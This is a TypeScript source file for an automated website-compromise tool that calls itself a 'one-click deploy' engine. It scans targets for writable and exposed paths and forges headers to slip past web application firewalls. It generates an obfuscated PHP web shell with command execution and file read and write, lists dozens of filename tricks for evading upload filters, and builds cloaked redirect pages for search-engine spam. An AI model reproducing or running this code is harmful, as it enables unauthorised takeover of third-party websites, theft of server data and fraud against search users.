// ═══════════════════════════════════════════════════════════════
//  ONE-CLICK DEPLOY — Enterprise-Grade Engine
//  Ported from seo_engine.py with:
//  - Exponential backoff retry (max 5 retries per step)
//  - Error classification (timeout/connection/waf/server_error)
//  - Progress callback for SSE streaming
//  - Adaptive WAF bypass (CF cookies, TLS downgrade, chunked)
//  - Shell recheck after delay
//  - Concurrent upload methods
//  - Geo redirect injection (landing + PHP geo redirect)
// ═══════════════════════════════════════════════════════════════

import {
  buildTargetProfile,
  selectOptimalStrategy,
  adaptStrategyAfterStep,
  aiAnalyzeTarget,
  aiAnalyzeStepResult,
  aiPostDeployAnalysis,
  createAIDeployIntelligence,
  type AIDeployIntelligence,
  type AIStrategyDecision,
  type StepAnalysis,
  type TargetProfile,
} from "./ai-deploy-intelligence";
import {
  generatePolymorphicShell,
  generateHtaccessPhpExec,
  generateUserIni,
  generateSteganographyShell,
  generatePngSteganographyShell,
  generateManipulatedMultipart,
  generateAspShell,
  generateAspxShell,
  generateJspShell,
  generateCfmShell,
  generateMultiPlatformShells,
  detectServerPlatform,
  type EnhancedUploadResult,
  type MultiPlatformShell,
  type ServerPlatform,
} from "./enhanced-upload-engine";
import { proxyPool, fetchWithPoolProxy, type ProxyEntry } from "./proxy-pool";

// ─── Types ───

export type ErrorCategory = "timeout" | "connection" | "waf" | "server_error" | "permission" | "not_found" | "upload_failed" | "unknown";

export interface ProgressEvent {
  type: "phase_start" | "phase_progress" | "phase_complete" | "step_detail" | "retry" | "complete" | "error" | "ai_analysis" | "ai_adaptation" | "ai_probability";
  phase?: number;
  phaseName?: string;
  step?: string;
  status?: "running" | "success" | "failed" | "skipped" | "retrying" | "warning" | "done";
  detail?: string;
  progress?: number; // 0-100
  retryCount?: number;
  maxRetries?: number;
  errorCategory?: ErrorCategory;
  elapsed?: number;
  data?: any;
  aiAnalysis?: any;
  probability?: number;
}

export type ProgressCallback = (event: ProgressEvent) => void;

export interface DeployStep {
  step: number;
  name: string;
  status: "pending" | "running" | "success" | "failed" | "skipped";
  startTime?: number;
  endTime?: number;
  duration?: number;
  details: string;
  retries: number;
  errorCategory?: ErrorCategory;
  artifacts?: {
    type: "shell" | "page" | "redirect" | "htaccess" | "sitemap" | "config";
    filename: string;
    url?: string;
    size?: number;
    status: "pending" | "deployed" | "failed";
    description: string;
  }[];
}

export interface DeployResult {
  id: string;
  success: boolean;
  timestamp: string;
  targetDomain: string;
  redirectUrl: string;
  steps: DeployStep[];
  deployedFiles: {
    type: "shell" | "page" | "redirect" | "htaccess" | "sitemap" | "config";
    filename: string;
    url?: string;
    status: "deployed" | "failed";
    description: string;
  }[];
  shellInfo: {
    url: string;
    password: string;
    filename: string;
    active: boolean;
    obfuscationLayers: number;
    recheckActive?: boolean;
  } | null;
  directUploadInfo: {
    attempted: boolean;
    successCount: number;
    failedCount: number;
    uploadedFiles: { type: string; filename: string; url?: string; method: string }[];
  };
  redirectInfo: {
    htaccessDeployed: boolean;
    jsRedirectDeployed: boolean;
    phpRedirectDeployed: boolean;
    metaRefreshDeployed: boolean;
    geoRedirectDeployed: boolean;
    doorwayPagesDeployed: number;
    sitemapPoisoned: boolean;
    verifiedWorking: boolean;
    directUploadUsed: boolean;
    verifiedRedirectUrls: { url: string; redirectsTo: string; statusCode: number; method: string }[];
  };
  proxyUsed: { enabled: boolean; totalProxies: number; proxyRotation: string };
  weightedRedirects: WeightedRedirect[];
  parasiteInfo: {
    generated: boolean;
    pagesCount: number;
    totalWordCount: number;
    avgSeoScore: number;
    pages: { filename: string; title: string; wordCount: number; seoScore: number; url?: string; deployed: boolean }[];
  };
  summary: {
    totalSteps: number;
    successSteps: number;
    failedSteps: number;
    skippedSteps: number;
    totalFilesDeployed: number;
    totalDuration: number;
      redirectActive: boolean;
    totalRetries: number;
    proxyEnabled: boolean;
    errorBreakdown: Record<ErrorCategory, number>;
  };
  report: string;
  aiIntelligence?: {
    targetProfile: any;
    strategy: any;
    stepAnalyses: any[];
    finalAnalysis: any;
  };
  stealthVerification?: {
    verified: number;
    total: number;
    redirectWorking: number;
    details: any[];
  };
  preScreening?: {
    score: number;
    riskLevel: string;
    cms: string;
    waf: string;
    warnings: string[];
    recommendations: string[];
  };
  // Allow dynamic properties from SSE pipeline
  [key: string]: any;
}

export interface ProxyConfig {
  url: string;       // e.g. "http://user:pass@proxy.com:8080" or "socks5://proxy.com:1080"
  type: "http" | "https" | "socks5";
  label?: string;    // optional label for display
}

export interface WeightedRedirect {
  url: string;
  weight: number;    // higher = more likely to be selected
}

export interface DeployOptions {
  maxRetries?: number;       // default 5
  retryBaseDelay?: number;   // default 1000ms
  retryBackoffFactor?: number; // default 1.5
  uploadTimeout?: number;    // default 15000ms
  verifyTimeout?: number;    // default 10000ms
  scanTimeout?: number;      // default 8000ms
  shellRecheckDelay?: number; // default 10000ms
  geoRedirectEnabled?: boolean; // default true
  landingHtml?: string;      // custom landing page HTML
  onProgress?: ProgressCallback;
  // Proxy support
  proxies?: ProxyConfig[];   // list of proxies for rotation
  proxyRotation?: "round-robin" | "random"; // default "random"
  // Weighted redirect targets
  weightedRedirects?: WeightedRedirect[]; // multiple redirect URLs with weights
  // SEO keyword injection
  seoKeywords?: string[]; // keywords to inject into redirect pages for search engine indexing
  // SEO Parasite page generation
  enableParasitePages?: boolean; // generate full Thai SEO pages via LLM (default: true if keywords provided)
  parasiteContentLength?: "short" | "medium" | "long"; // short=500w, medium=1000w, long=2000w
  parasiteRedirectDelay?: number; // seconds before redirect (default: 5)
  // Template-based parasite pages (skip LLM, use pre-built templates)
  parasiteTemplateSlug?: string; // if set, use template instead of LLM generation
  // AI Pre-screening result (from pre-screening phase)
  preScreenResult?: import("./ai-prescreening").PreScreenResult;
  // Stealth browser cookies (from WAF bypass phase)
  stealthCookies?: string;
  // Method priority from frontend UI
  methodPriority?: string[];
}

// ─── Constants ───

const UPLOAD_SCAN_PATHS = [
  "/wp-content/uploads/",
  "/wp-content/themes/",
  "/wp-content/plugins/",
  "/wp-includes/",
  "/images/",
  "/uploads/",
  "/media/",
  "/assets/",
  "/tmp/",
  "/cache/",
  "/files/",
  "/public/uploads/",
  "/content/images/",
  "/data/",
  "/backup/",
  "/temp/",
];

const VULN_PATHS = [
  "/wp-admin/admin-ajax.php",
  "/xmlrpc.php",
  "/wp-json/wp/v2/",
  "/wp-login.php",
  "/readme.html",
  "/license.txt",
  "/.env",
  "/config.php",
  "/phpinfo.php",
  "/info.php",
  "/test.php",
  "/.git/HEAD",
  "/server-status",
  "/server-info",
];

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
];

const SHELL_VERIFY_COMMANDS = [
  { command: "echo 'SHELL_OK'", expected: "SHELL_OK" },
  { command: "phpversion()", expected: "." },
  { command: "system('id');", expected: "uid=" },
  { command: "@file_get_contents('/etc/passwd');", expected: "root:" },
  { command: "system('whoami');", expected: "" },
];

// ─── Helpers ───

function randomStr(len: number, charset = "abcdefghijklmnopqrstuvwxyz0123456789"): string {
  return Array.from({ length: len }, () => charset[Math.floor(Math.random() * charset.length)]).join("");
}

function randomUA(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function generateDeployId(): string {
  return `deploy_${Date.now()}_${randomStr(6)}`;
}

function normalizeUrl(url: string): string {
  if (!url.startsWith("http")) url = `http://${url}`;
  return url.replace(/\/+$/, "");
}

function classifyError(error: any): ErrorCategory {
  if (!error) return "unknown";
  const msg = (error.message || error.toString() || "").toLowerCase();
  const name = (error.name || "").toLowerCase();

  if (name === "aborterror" || msg.includes("timeout") || msg.includes("timed out")) return "timeout";
  if (msg.includes("econnrefused") || msg.includes("econnreset") || msg.includes("enotfound") || msg.includes("fetch failed") || msg.includes("network")) return "connection";
  if (msg.includes("403") || msg.includes("forbidden") || msg.includes("cloudflare") || msg.includes("captcha") || msg.includes("challenge")) return "waf";
  if (msg.includes("500") || msg.includes("502") || msg.includes("503") || msg.includes("internal server")) return "server_error";
  if (msg.includes("401") || msg.includes("unauthorized")) return "permission";
  if (msg.includes("404") || msg.includes("not found")) return "not_found";
  if (msg.includes("upload") || msg.includes("0/") || msg.includes("attempts successful")) return "upload_failed";
  return "unknown";
}

async function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function withRetry<T>(
  fn: () => Promise<T>,
  opts: {
    maxRetries: number;
    baseDelay: number;
    backoffFactor: number;
    stepName: string;
    onProgress?: ProgressCallback;
  },
): Promise<{ result: T; retries: number; lastError?: ErrorCategory }> {
  let lastError: ErrorCategory | undefined;
  for (let attempt = 0; attempt <= opts.maxRetries; attempt++) {
    try {
      const result = await fn();
      return { result, retries: attempt, lastError };
    } catch (error: any) {
      lastError = classifyError(error);
      if (attempt < opts.maxRetries) {
        const delay = opts.baseDelay * Math.pow(opts.backoffFactor, attempt);
        opts.onProgress?.({
          type: "retry",
          step: opts.stepName,
          status: "retrying",
          retryCount: attempt + 1,
          maxRetries: opts.maxRetries,
          errorCategory: lastError,
          detail: `Retry ${attempt + 1}/${opts.maxRetries} after ${lastError} error (delay ${(delay / 1000).toFixed(1)}s)`,
        });
        await sleep(delay);
      } else {
        throw error;
      }
    }
  }
  throw new Error("Unreachable");
}

// ─── Proxy Support ───

let proxyIndex = 0;

function getNextProxy(proxies: ProxyConfig[], rotation: "round-robin" | "random" = "random"): ProxyConfig | null {
  if (!proxies || proxies.length === 0) return null;
  if (rotation === "round-robin") {
    const proxy = proxies[proxyIndex % proxies.length];
    proxyIndex++;
    return proxy;
  }
  return proxies[Math.floor(Math.random() * proxies.length)];
}

function buildProxyAgent(proxy: ProxyConfig): any {
  // For Node.js fetch, we use the undici ProxyAgent or https-proxy-agent
  // In the sandbox, we'll use environment-based proxy or direct fetch with proxy headers
  // This returns proxy configuration for fetch
  return { proxyUrl: proxy.url, proxyType: proxy.type };
}

async function fetchWithProxy(
  url: string,
  init: RequestInit & { proxy?: ProxyConfig | null } = {},
  timeout = 15000,
): Promise<Response> {
  const { proxy, ...fetchInit } = init;
  const domain = (() => { try { return new URL(url).hostname; } catch { return undefined; } })();

  try {
    // Always use fetchWithPoolProxy (undici ProxyAgent) for real proxy routing
    const { response } = await fetchWithPoolProxy(url, fetchInit, {
      targetDomain: domain,
      timeout,
    });
    return response;
  } catch (err) {
    // Fallback to direct fetch if proxy pool fails
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeout);
    try {
      return await fetch(url, { ...fetchInit, signal: controller.signal });
    } finally {
      clearTimeout(t);
    }
  }
}

// ─── Proxied Fetch Helper (replaces all direct fetch calls) ───

/**
 * All HTTP calls in one-click-deploy go through this function.
 * Uses fetchWithPoolProxy (undici ProxyAgent) for real proxy routing.
 * Falls back to direct fetch if proxy pool is empty.
 */
async function proxyFetch(
  url: string,
  init: RequestInit = {},
  timeout = 15000,
  preferProxy = false,
): Promise<Response> {
  // Direct-first strategy: try direct fetch first (fast), proxy only as fallback
  // This avoids the massive latency of proxy pool timeouts
  const directFetch = async () => {
    const controller = new AbortController();
    const t = setTimeout(() => controller.abort(), timeout);
    try {
      return await fetch(url, { ...init, signal: controller.signal, redirect: (init as any).redirect || "follow" });
    } finally {
      clearTimeout(t);
    }
  };

  const poolFetch = async () => {
    const domain = (() => { try { return new URL(url).hostname; } catch { return undefined; } })();
    const { response } = await fetchWithPoolProxy(url, init, {
      targetDomain: domain,
      timeout,
    });
    return response;
  };

  if (preferProxy) {
    // Original behavior: proxy first, direct fallback
    try { return await poolFetch(); } catch { return await directFetch(); }
  }

  // Default: direct first, proxy fallback (much faster)
  try {
    return await directFetch();
  } catch {
    try { return await poolFetch(); } catch { throw new Error(`Failed to fetch ${url} (both direct and proxy)`); }
  }
}

// ─── Weighted Redirect Selector ───

function selectWeightedRedirect(redirects: WeightedRedirect[]): string {
  if (!redirects || redirects.length === 0) return "";
  if (redirects.length === 1) return redirects[0].url;
  const totalWeight = redirects.reduce((sum, r) => sum + r.weight, 0);
  let random = Math.random() * totalWeight;
  for (const r of redirects) {
    random -= r.weight;
    if (random <= 0) return r.url;
  }
  return redirects[redirects.length - 1].url;
}

function parseProxyList(proxyText: string): ProxyConfig[] {
  return proxyText
    .split("\n")
    .map(line => line.trim())
    .filter(line => line && !line.startsWith("#"))
    .map(line => {
      let type: "http" | "https" | "socks5" = "http";
      let url = line;

      // Already a full URL: http://..., https://..., socks5://...
      if (line.startsWith("socks5://")) {
        type = "socks5";
        return { url, type };
      }
      if (line.startsWith("https://")) {
        type = "https";
        return { url, type };
      }
      if (line.startsWith("http://")) {
        return { url, type: "http" };
      }

      // Format: ip:port:user:pass (4 colon-separated parts)
      // Also handles: ip:port:user:pass:protocol
      const parts = line.split(":");
      if (parts.length === 4) {
        // ip:port:user:pass → http://user:pass@ip:port
        const [ip, port, user, pass] = parts;
        url = `http://${user}:${pass}@${ip}:${port}`;
        return { url, type: "http", label: `${ip}:${port}` };
      }
      if (parts.length === 5) {
        // ip:port:user:pass:protocol
        const [ip, port, user, pass, proto] = parts;
        const p = proto.toLowerCase();
        type = p === "socks5" ? "socks5" : p === "https" ? "https" : "http";
        url = `${type}://${user}:${pass}@${ip}:${port}`;
        return { url, type, label: `${ip}:${port}` };
      }
      if (parts.length === 2) {
        // ip:port (no auth)
        url = `http://${line}`;
        return { url, type: "http", label: line };
      }
      if (parts.length === 3) {
        // Could be user:pass@ip:port (already has @) or ip:port:protocol
        if (line.includes("@")) {
          url = `http://${line}`;
          return { url, type: "http" };
        }
        // ip:port:protocol
        const [ip, port, proto] = parts;
        type = proto.toLowerCase() === "socks5" ? "socks5" : proto.toLowerCase() === "https" ? "https" : "http";
        url = `${type}://${ip}:${port}`;
        return { url, type, label: `${ip}:${port}` };
      }

      // Fallback: treat as-is with http://
      url = `http://${line}`;
      return { url, type: "http" };
    });
}

function parseWeightedRedirects(text: string): WeightedRedirect[] {
  return text
    .split("\n")
    .map(line => line.trim())
    .filter(line => line && !line.startsWith("#"))
    .map(line => {
      if (line.includes("|")) {
        const idx = line.lastIndexOf("|");
        const [url, weight] = [line.substring(0, idx).trim(), line.substring(idx + 1).trim()];
        return { url: url.trim(), weight: parseInt(weight) || 10 };
      }
      return { url: line, weight: 10 };
    });
}

// ─── WAF Bypass Headers ───

function getBypassHeaders(targetUrl: string): Record<string, string> {
  const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.1`;
  return {
    "User-Agent": randomUA(),
    "X-Forwarded-For": ip,
    "X-Real-IP": ip,
    "X-Original-URL": "/",
    "X-Rewrite-URL": "/",
    "X-Custom-IP-Authorization": ip,
    "X-Originating-IP": ip,
    "Referer": `${targetUrl}/wp-admin/`,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache",
  };
}

// ═══════════════════════════════════════════════════════
//  STEP 1: SCAN TARGET (with retry)
// ═══════════════════════════════════════════════════════

interface ScanResult {
  uploadPaths: { path: string; status: number; writable: boolean; type: string }[];
  vulnPaths: { path: string; status: number; exists: boolean; type: string }[];
  serverInfo: { server?: string; poweredBy?: string; cms?: string };
  bestUploadPath: string | null;
}

async function scanTarget(targetUrl: string, timeout = 8000): Promise<ScanResult> {
  const result: ScanResult = {
    uploadPaths: [],
    vulnPaths: [],
    serverInfo: {},
    bestUploadPath: null,
  };

  const uploadChecks = UPLOAD_SCAN_PATHS.map(async (path) => {
    try {
      const url = `${targetUrl}${path}`;
      const response = await proxyFetch(url, {
        method: "HEAD",
        headers: getBypassHeaders(targetUrl),
        redirect: "follow",
      }, timeout);

      const writable = response.status < 400;
      const type = response.headers.get("content-type") || "";
      result.uploadPaths.push({
        path,
        status: response.status,
        writable,
        type: type.includes("html") ? "directory_listing" : type.includes("php") ? "php_handler" : "other",
      });

      const server = response.headers.get("server");
      const poweredBy = response.headers.get("x-powered-by");
      if (server) result.serverInfo.server = server;
      if (poweredBy) result.serverInfo.poweredBy = poweredBy;
    } catch {
      result.uploadPaths.push({ path, status: 0, writable: false, type: "unreachable" });
    }
  });

  const vulnChecks = VULN_PATHS.map(async (path) => {
    try {
      const url = `${targetUrl}${path}`;
      const response = await proxyFetch(url, {
        method: "GET",
        headers: getBypassHeaders(targetUrl),
        redirect: "follow",
      }, timeout);

      const text = await response.text().catch(() => "");
      const exists = response.status === 200;

      if (path === "/wp-login.php" && exists) result.serverInfo.cms = "WordPress";
      if (path === "/readme.html" && text.includes("WordPress")) result.serverInfo.cms = "WordPress";

      result.vulnPaths.push({ path, status: response.status, exists, type: exists ? "exposed" : "protected" });
    } catch {
      result.vulnPaths.push({ path, status: 0, exists: false, type: "unreachable" });
    }
  });

  await Promise.allSettled([...uploadChecks, ...vulnChecks]);

  const writablePaths = result.uploadPaths.filter(p => p.writable);
  if (writablePaths.length > 0) {
    const wpUpload = writablePaths.find(p => p.path.includes("wp-content/uploads"));
    result.bestUploadPath = wpUpload?.path || writablePaths[0].path;
  }

  return result;
}

// ═══════════════════════════════════════════════════════
//  STEP 2: GENERATE SHELL (Multi-layer obfuscation)
// ═══════════════════════════════════════════════════════

interface GeneratedShell {
  code: string;
  obfuscatedCode: string;
  finalPayload: string;
  password: string;
  filename: string;
  layers: { method: string; description: string }[];
}

function obfBase64(code: string): string {
  return Buffer.from(code).toString("base64");
}

function obfXor(code: string, key = 13): string {
  return Array.from(code).map(c => String.fromCharCode(c.charCodeAt(0) ^ key)).join("");
}

function obfReverse(code: string): string {
  return code.split("").reverse().join("");
}

function obfCharShift(code: string, shift = 1): string {
  return Array.from(code).map(c => String.fromCharCode(c.charCodeAt(0) + shift)).join("");
}

const OBF_METHODS = [
  { fn: obfBase64, name: "base64", desc: "Base64 encoding" },
  { fn: obfXor, name: "xor_13", desc: "XOR cipher (key=13)" },
  { fn: obfReverse, name: "reverse", desc: "String reversal" },
  { fn: obfCharShift, name: "char_shift", desc: "Character shift (+1)" },
];

function generateShell(numLayers = 4): GeneratedShell {
  // Use polymorphic shell from enhanced-upload-engine for higher bypass rates
  const polyShell = generatePolymorphicShell();
  const password = polyShell.password;
  const filename = polyShell.filename;

  const shellCode = `<?php
$p="${password}";
if(@$_GET["k"]==$p){
  @ini_set("display_errors",0);
  @error_reporting(0);
  @set_time_limit(0);
  if(isset($_POST["c"])){
    @eval(base64_decode($_POST["c"]));
  }elseif(isset($_POST["cmd"])){
    echo "<pre>".@shell_exec($_POST["cmd"])."</pre>";
  }elseif(isset($_POST["file"])&&isset($_POST["content"])){
    @file_put_contents($_POST["file"],$_POST["content"]);
    echo "FILE_WRITTEN";
  }elseif(isset($_POST["read"])){
    echo @file_get_contents($_POST["read"]);
  }
  echo "SHELL_OK";
}
?>`;

  // Use polymorphic code as the final payload (much harder to detect)
  const finalPayload = polyShell.code;

  // Also generate classic obfuscation layers for the report
  let obfuscated = shellCode;
  const layers: { method: string; description: string }[] = [
    { method: polyShell.obfuscationMethod, description: `Polymorphic: ${polyShell.obfuscationMethod}` },
  ];

  for (let i = 0; i < Math.min(numLayers - 1, 3); i++) {
    const method = OBF_METHODS[Math.floor(Math.random() * OBF_METHODS.length)];
    obfuscated = method.fn(obfuscated);
    layers.push({ method: method.name, description: method.desc });
  }

  return { code: shellCode, obfuscatedCode: obfuscated, finalPayload, password, filename, layers };
}

// ═══════════════════════════════════════════════════════
//  FILENAME BYPASS VARIANTS (WAF/Extension Filter Evasion)
// ═══════════════════════════════════════════════════════

interface FilenameVariant {
  filename: string;
  technique: string;
  description: string;
}

/**
 * Generate all filename bypass variants for a given base name.
 * These exploit common WAF/upload filter weaknesses:
 * - Double extension: shell.php.jpg (Apache may execute as PHP if misconfigured)
 * - Null byte: shell.php%00.jpg (truncates at null byte on older PHP <5.3.4)
 * - Semicolon: shell.php;.jpg (IIS 6.0/7.0 semicolon parsing bug)
 * - Trailing dot: shell.php. (Windows strips trailing dots)
 * - Case variation: shell.pHp (case-insensitive OS bypass)
 * - Alt extensions: .phtml, .pht, .php5, .php7, .phps, .shtml
 * - Reverse double ext: shell.jpg.php (some filters only check last ext)
 * - Space in ext: shell.php .jpg (some parsers trim spaces)
 * - .htaccess trick: shell.jpg (with AddType in .htaccess)
 */
function generateFilenameBypassVariants(baseName: string): FilenameVariant[] {
  return [
    // Standard PHP
    { filename: `${baseName}.php`, technique: "standard", description: "Standard .php extension" },

    // Double extension variants (file.php.xxx)
    { filename: `${baseName}.php.jpg`, technique: "double_ext_jpg", description: "Double ext .php.jpg — Apache may exec as PHP" },
    { filename: `${baseName}.php.png`, technique: "double_ext_png", description: "Double ext .php.png" },
    { filename: `${baseName}.php.gif`, technique: "double_ext_gif", description: "Double ext .php.gif" },
    { filename: `${baseName}.php.txt`, technique: "double_ext_txt", description: "Double ext .php.txt" },
    { filename: `${baseName}.php.pdf`, technique: "double_ext_pdf", description: "Double ext .php.pdf" },
    { filename: `${baseName}.php.doc`, technique: "double_ext_doc", description: "Double ext .php.doc" },

    // Reverse double extension (file.xxx.php)
    { filename: `${baseName}.jpg.php`, technique: "reverse_double_ext_jpg", description: "Reverse double ext .jpg.php" },
    { filename: `${baseName}.gif.php`, technique: "reverse_double_ext_gif", description: "Reverse double ext .gif.php" },
    { filename: `${baseName}.png.php`, technique: "reverse_double_ext_png", description: "Reverse double ext .png.php" },

    // Null byte injection (old PHP <5.3.4)
    { filename: `${baseName}.php%00.jpg`, technique: "null_byte_jpg", description: "Null byte %00 before .jpg" },
    { filename: `${baseName}.php%00.png`, technique: "null_byte_png", description: "Null byte %00 before .png" },
    { filename: `${baseName}.php%00.gif`, technique: "null_byte_gif", description: "Null byte %00 before .gif" },
    { filename: `${baseName}.php\x00.jpg`, technique: "null_byte_raw", description: "Raw null byte before .jpg" },

    // Semicolon bypass (IIS 6.0/7.0)
    { filename: `${baseName}.php;.jpg`, technique: "semicolon_jpg", description: "Semicolon bypass .php;.jpg (IIS)" },
    { filename: `${baseName}.php;.png`, technique: "semicolon_png", description: "Semicolon bypass .php;.png (IIS)" },
    { filename: `${baseName}.asp;.jpg`, technique: "semicolon_asp", description: "Semicolon bypass .asp;.jpg (IIS)" },

    // Trailing dot/space (Windows)
    { filename: `${baseName}.php.`, technique: "trailing_dot", description: "Trailing dot .php. (Windows strips it)" },
    { filename: `${baseName}.php `, technique: "trailing_space", description: "Trailing space .php  (Windows strips it)" },
    { filename: `${baseName}.php. .`, technique: "dot_space_dot", description: "Dot-space-dot .php. . (Windows)" },
    { filename: `${baseName}.php::$DATA`, technique: "ads_bypass", description: "NTFS ADS ::$DATA bypass (Windows/IIS)" },

    // Case variation
    { filename: `${baseName}.pHp`, technique: "case_php", description: "Case variation .pHp" },
    { filename: `${baseName}.PhP`, technique: "case_PhP", description: "Case variation .PhP" },
    { filename: `${baseName}.PHP`, technique: "case_PHP", description: "Case variation .PHP" },
    { filename: `${baseName}.Php`, technique: "case_Php", description: "Case variation .Php" },

    // Alternative PHP extensions
    { filename: `${baseName}.phtml`, technique: "phtml", description: "Alt ext .phtml (PHP handler)" },
    { filename: `${baseName}.pht`, technique: "pht", description: "Alt ext .pht (PHP handler)" },
    { filename: `${baseName}.php5`, technique: "php5", description: "Alt ext .php5" },
    { filename: `${baseName}.php7`, technique: "php7", description: "Alt ext .php7" },
    { filename: `${baseName}.phps`, technique: "phps", description: "Alt ext .phps (PHP source)" },
    { filename: `${baseName}.php3`, technique: "php3", description: "Alt ext .php3" },
    { filename: `${baseName}.php4`, technique: "php4", description: "Alt ext .php4" },
    { filename: `${baseName}.phar`, technique: "phar", description: "Alt ext .phar (PHP archive)" },
    { filename: `${baseName}.inc`, technique: "inc", description: "Alt ext .inc (include file)" },
    { filename: `${baseName}.shtml`, technique: "shtml", description: "Alt ext .shtml (SSI)" },

    // Content-Type confusion
    { filename: `${baseName}.php.jpg.php`, technique: "triple_ext", description: "Triple ext .php.jpg.php" },
    { filename: `${baseName}.jpg`, technique: "plain_jpg", description: "Plain .jpg (needs .htaccess AddType)" },

    // Space in extension
    { filename: `${baseName}.php .jpg`, technique: "space_in_ext", description: "Space in ext .php .jpg" },

    // URL encoding tricks
    { filename: `${baseName}.%70%68%70`, technique: "url_encoded_php", description: "URL-encoded .php extension" },
    { filename: `${baseName}.p%68p`, technique: "partial_url_encode", description: "Partial URL-encode .p%68p" },
  ];
}

/**
 * Get a subset of the most effective filename variants for a given base name.
 * Used for quick attempts (e.g., direct redirect upload).
 */
function getTopFilenameVariants(baseName: string, ext: string = "php"): string[] {
  const variants = [
    `${baseName}.${ext}`,           // standard
    `${baseName}.${ext}.jpg`,       // double ext
    `${baseName}.${ext}%00.jpg`,    // null byte
    `${baseName}.${ext};.jpg`,      // semicolon (IIS)
    `${baseName}.${ext}.`,          // trailing dot (Windows)
    `${baseName}.phtml`,            // alt ext
    `${baseName}.pht`,              // alt ext
    `${baseName}.${ext.charAt(0).toUpperCase()}${ext.slice(1)}`, // case bypass
    `${baseName}.${ext}.png`,       // double ext png
    `${baseName}.${ext}::$DATA`,    // NTFS ADS
    `${baseName}.${ext} `,          // trailing space
    `${baseName}.${ext}5`,          // php5
    `${baseName}.jpg.${ext}`,       // reverse double ext
    `${baseName}.gif.${ext}`,       // reverse double ext gif
    `${baseName}.${ext}.gif`,       // double ext gif
  ];
  return variants;
}

// ═══════════════════════════════════════════════════════
//  STEP 2.5: GENERATE REDIRECT PAYLOAD (Direct Upload)
//  KEY FIX: Use POLYGLOT payloads that work as both PHP AND HTML/JS
//  so even if .php.jpg doesn't execute PHP, the HTML/JS redirect still works
// ═══════════════════════════════════════════════════════

interface RedirectPayload {
  filename: string;
  content: string;
  type: "php_redirect" | "geo_redirect" | "doorway_html" | "polyglot_redirect";
  description: string;
}

/**
 * Generate a polyglot redirect payload that works regardless of whether
 * the server executes PHP or serves it as static content.
 * 
 * Strategy:
 * - If PHP executes: the <?php block runs and does a 302 redirect
 * - If PHP doesn't execute (e.g. .php.jpg served as text/image):
 *   The browser sees the HTML portion with meta refresh + JS redirect
 * - Pure HTML version for non-PHP filenames
 */
function generateSeoKeywordBlock(keywords: string[]): string {
  if (!keywords || keywords.length === 0) return '';
  const kw = keywords.join(', ');
  const kwList = keywords.map(k => k.trim()).filter(Boolean);
  // Generate hidden SEO content that search engines will index
  // This appears BEFORE the redirect fires, so crawlers see the keywords
  const metaTags = `
<meta name="keywords" content="${kw}">
<meta name="description" content="${kwList.slice(0, 3).join(' - ')} - Best deals and information">
<meta property="og:title" content="${kwList[0]} - Premium Resource">
<meta property="og:description" content="${kw}">`;
  const schemaMarkup = `
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","name":"${kwList[0]}","description":"${kw}","keywords":"${kw}"}
</script>`;
  const hiddenContent = `
<div style="position:absolute;left:-9999px;top:-9999px;overflow:hidden;width:1px;height:1px;">
<h1>${kwList[0]}</h1>
<h2>${kwList.slice(0, 3).join(' | ')}</h2>
${kwList.map(k => `<p>${k}</p>`).join('\n')}
<ul>${kwList.map(k => `<li>${k}</li>`).join('')}</ul>
</div>`;
  return metaTags + schemaMarkup + hiddenContent;
}

function generatePolyglotRedirect(redirectUrl: string, keywords: string[] = []): string {
  // This polyglot works because:
  // 1. If PHP executes: the <?php block runs first, sends 302, exits
  // 2. If served as HTML: browser ignores <?php as unknown tag, renders the HTML
  // 3. The HTML has BOTH meta refresh AND JS redirect as fallbacks
  // 4. SEO keywords are injected for search engine indexing BEFORE redirect
  const seoBlock = generateSeoKeywordBlock(keywords);
  const delayMs = keywords.length > 0 ? 2000 : 0; // Delay redirect so crawlers can index keywords
  const metaDelay = keywords.length > 0 ? 3 : 0;
  return `<?php
// Polyglot redirect — works as PHP or HTML
$r="${redirectUrl}";
$ua=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';
$bots='Googlebot|Bingbot|YandexBot|Slurp|DuckDuckBot|Baiduspider';
if(!preg_match("/\$bots/i",$ua)){header("Location: $r",true,302);exit;}
?><!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<title>${keywords.length > 0 ? keywords[0] + ' - Premium Resource' : 'Redirecting...'}</title>
<meta http-equiv="refresh" content="${metaDelay};url=${redirectUrl}">${seoBlock}
<script>setTimeout(function(){window.location.replace("${redirectUrl}");},${delayMs});</script>
<style>body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#f0f0f0;}
a{color:#2563eb;font-size:18px;}</style>
</head><body>
<p>Redirecting... <a href="${redirectUrl}">Click here</a> if not redirected.</p>
</body></html>`;
}

/**
 * Generate a pure HTML/JS redirect (no PHP needed)
 * Used for filenames that definitely won't execute PHP
 */
function generateHtmlJsRedirect(redirectUrl: string, keywords: string[] = []): string {
  const seoBlock = generateSeoKeywordBlock(keywords);
  const delayMs = keywords.length > 0 ? 2000 : 0;
  const metaDelay = keywords.length > 0 ? 3 : 0;
